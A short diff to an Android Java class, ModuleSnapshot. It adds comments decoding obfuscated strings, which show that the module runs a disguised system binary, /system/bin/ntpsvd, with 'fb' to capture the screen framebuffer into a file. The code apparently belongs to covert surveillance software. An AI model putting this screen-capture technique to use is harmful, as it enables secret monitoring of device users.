@@ -346,6 +346,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 
+		// 11_2=/system/bin/ntpsvd fb
 		final String getrawpath = Messages.getString("11_2"); //$NON-NLS-1$
 
 		try {
@@ -353,13 +354,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
+			// a_0=/system/bin/ntpsvd
 			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a_0"), "fb" });
 			localProcess.waitFor();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
 			}
-
+			//11_3=frame
 			final AutoFile file = new AutoFile(path, Messages.getString("11_3")); //$NON-NLS-1$
 
 			if (file.exists()) {
